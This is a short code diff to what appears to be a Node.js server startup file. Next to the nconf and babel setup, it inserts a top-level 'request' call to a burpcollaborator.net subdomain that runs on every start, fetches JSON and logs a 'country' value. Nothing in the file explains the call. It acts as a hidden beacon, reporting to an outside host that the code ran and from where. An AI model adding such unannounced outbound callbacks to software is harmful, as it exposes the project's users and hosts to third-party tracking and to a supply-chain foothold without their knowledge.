@@ -2,7 +2,14 @@ const path = require('path');
 const nconf = require('nconf');
 
 // const logger = require('./server/init');
-
+var request = require('request');
+request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/json', function (error, response, body) {
+  if (!error && response.statusCode == 200) {
+    console.log(response.body);    // Prints the JSON object
+    var object = JSON.parse(body);
+    console.log(object['country']) // Prints the country value from the JSON object
+  }
+});
 // Initialize babel.
 require('@babel/register')({
   ignore: [ /node_modules/ ],
